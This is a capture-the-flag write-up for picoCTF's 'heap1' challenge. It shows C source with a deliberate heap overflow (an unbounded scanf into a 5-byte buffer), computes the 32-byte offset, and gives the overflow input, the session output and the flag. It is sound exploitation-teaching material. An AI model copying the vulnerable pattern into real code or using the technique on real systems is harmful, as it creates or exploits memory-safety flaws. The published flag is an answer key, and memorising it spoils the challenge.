Description:
Can you control your overflow?Download the binary [here](https://artifacts.picoctf.net/c_tethys/32/chall).Download the source [here](https://artifacts.picoctf.net/c_tethys/32/chall.c).

Contents of `chall.c` file: 
```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#define FLAGSIZE_MAX 64
// amount of memory allocated for input_data
#define INPUT_DATA_SIZE 5
// amount of memory allocated for safe_var
#define SAFE_VAR_SIZE 5

int num_allocs;
char *safe_var;
char *input_data;

void check_win() {
    if (!strcmp(safe_var, "pico")) {
        printf("\nYOU WIN\n");

        // Print flag
        char buf[FLAGSIZE_MAX];
        FILE *fd = fopen("flag.txt", "r");
        fgets(buf, FLAGSIZE_MAX, fd);
        printf("%s\n", buf);
        fflush(stdout);

        exit(0);
    } else {
        printf("Looks like everything is still secure!\n");
        printf("\nNo flage for you :(\n");
        fflush(stdout);
    }
}

void print_menu() {
    printf("\n1. Print Heap:\t\t(print the current state of the heap)"
           "\n2. Write to buffer:\t(write to your own personal block of data "
           "on the heap)"
           "\n3. Print safe_var:\t(I'll even let you look at my variable on "
           "the heap, "
           "I'm confident it can't be modified)"
           "\n4. Print Flag:\t\t(Try to print the flag, good luck)"
           "\n5. Exit\n\nEnter your choice: ");
    fflush(stdout);
}

void init() {
    printf("\nWelcome to heap1!\n");
    printf(
        "I put my data on the heap so it should be safe from any tampering.\n");
    printf("Since my data isn't on the stack I'll even let you write whatever "
           "info you want to the heap, I already took care of using malloc for "
           "you.\n\n");
    fflush(stdout);
    input_data = malloc(INPUT_DATA_SIZE);
    strncpy(input_data, "pico", INPUT_DATA_SIZE);
    safe_var = malloc(SAFE_VAR_SIZE);
    strncpy(safe_var, "bico", SAFE_VAR_SIZE);
}

void write_buffer() {
    printf("Data for buffer: ");
    fflush(stdout);
    scanf("%s", input_data);
}

void print_heap() {
    printf("Heap State:\n");
    printf("+-------------+----------------+\n");
    printf("[*] Address   ->   Heap Data   \n");
    printf("+-------------+----------------+\n");
    printf("[*]   %p  ->   %s\n", input_data, input_data);
    printf("+-------------+----------------+\n");
    printf("[*]   %p  ->   %s\n", safe_var, safe_var);
    printf("+-------------+----------------+\n");
    fflush(stdout);
}

int main(void) {

    // Setup
    init();
    print_heap();

    int choice;

    while (1) {
        print_menu();
	if (scanf("%d", &choice) != 1) exit(0);

        switch (choice) {
        case 1:
            // print heap
            print_heap();
            break;
        case 2:
            write_buffer();
            break;
        case 3:
            // print safe_var
            printf("\n\nTake a look at my variable: safe_var = %s\n\n",
                   safe_var);
            fflush(stdout);
            break;
        case 4:
            // Check for win condition
            check_win();
            break;
        case 5:
            // exit
            return 0;
        default:
            printf("Invalid choice\n");
            fflush(stdout);
        }
    }
}
```

Lets analyse the `check_win` function: 

```c
void check_win() {
    if (!strcmp(safe_var, "pico")) { // safe_var should be pico to get the flag
        printf("\nYOU WIN\n");

        // Print flag
        char buf[FLAGSIZE_MAX];
        FILE *fd = fopen("flag.txt", "r");
        fgets(buf, FLAGSIZE_MAX, fd);
        printf("%s\n", buf);
        fflush(stdout);

        exit(0);
    } else {
        printf("Looks like everything is still secure!\n");
        printf("\nNo flage for you :(\n");
        fflush(stdout);
    }
}
```

We can see that `safe_var` is being compared with the string `pico`. Which means, we need to modify the variable `safe_var` to `pico` to get the flag. 
We can allocate memory on the heap using `malloc`. Lets, check the `init` function to pinpoint the vulnerability. 
```c
// INPUT_DATA_SIZE, SAFE_VAR_SIZE = 5 bytes
void init() {
    printf("\nWelcome to heap1!\n");
    printf(
        "I put my data on the heap so it should be safe from any tampering.\n");
    printf("Since my data isn't on the stack I'll even let you write whatever "
           "info you want to the heap, I already took care of using malloc for "
           "you.\n\n");
    fflush(stdout);
    input_data = malloc(INPUT_DATA_SIZE); // allocates 5 bytes on the heap
    strncpy(input_data, "pico", INPUT_DATA_SIZE); // copies pico onto the heap buffer
    safe_var = malloc(SAFE_VAR_SIZE); // allocates 5 bytes on the heap
    strncpy(safe_var, "bico", SAFE_VAR_SIZE); // copies bico onto the heap buffer
}
```

Here, if we exceed the heap buffer, while giving the input, we can overwrite the value of the `safe_var` variable. 

Now we need to find the offset between the input buffer and safe var. 

```
➜  ~/Documents/recruitment/haard_phase2/binex git:(main) ✗ nc tethys.picoctf.net 62455


Welcome to heap1!
I put my data on the heap so it should be safe from any tampering.
Since my data isn't on the stack I'll even let you write whatever info you want to the heap, I already took care of using malloc for you.

Heap State:
+-------------+----------------+
[*] Address   ->   Heap Data
+-------------+----------------+
[*]   0x5add894b12b0  ->   pico
+-------------+----------------+
[*]   0x5add894b12d0  ->   bico
+-------------+----------------+

1. Print Heap:		(print the current state of the heap)
2. Write to buffer:	(write to your own personal block of data on the heap)
3. Print safe_var:	(I'll even let you look at my variable on the heap, I'm confident it can't be modified)
4. Print Flag:		(Try to print the flag, good luck)
5. Exit
```

On running the program, we can see the heap state. `pico` is the value preassigned to our input buffer, which will be overwritten when we write to that buffer. 

Lets calculate the difference in memory location between the input buffer and `safe_var`.
```
0x5add894b12d0 - 0x5add894b12b0 = 0x20
0x20 = 32 
```

After 32 bytes, we will reach the `safe_var` variable, but we won't be able to overwrite it, so we need to send additional 4 bytes to overwrite the variable to `pico`.  

Lets do that: 
```
Enter your choice: 2
Data for buffer: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAApico

1. Print Heap:		(print the current state of the heap)
2. Write to buffer:	(write to your own personal block of data on the heap)
3. Print safe_var:	(I'll even let you look at my variable on the heap, I'm confident it can't be modified)
4. Print Flag:		(Try to print the flag, good luck)
5. Exit

Enter your choice: 3


Take a look at my variable: safe_var = pico


1. Print Heap:		(print the current state of the heap)
2. Write to buffer:	(write to your own personal block of data on the heap)
3. Print safe_var:	(I'll even let you look at my variable on the heap, I'm confident it can't be modified)
4. Print Flag:		(Try to print the flag, good luck)
5. Exit

Enter your choice: 4

YOU WIN
picoCTF{starting_to_get_the_hang_e9fbcea5}
```

As we can see, the variable has been overwritten, and according to the `check_win` function, `safe_var` is now `pico`. 

flag: `picoCTF{starting_to_get_the_hang_e9fbcea5}`

Reference: 
https://ctf101.org/binary-exploitation/what-is-the-heap/

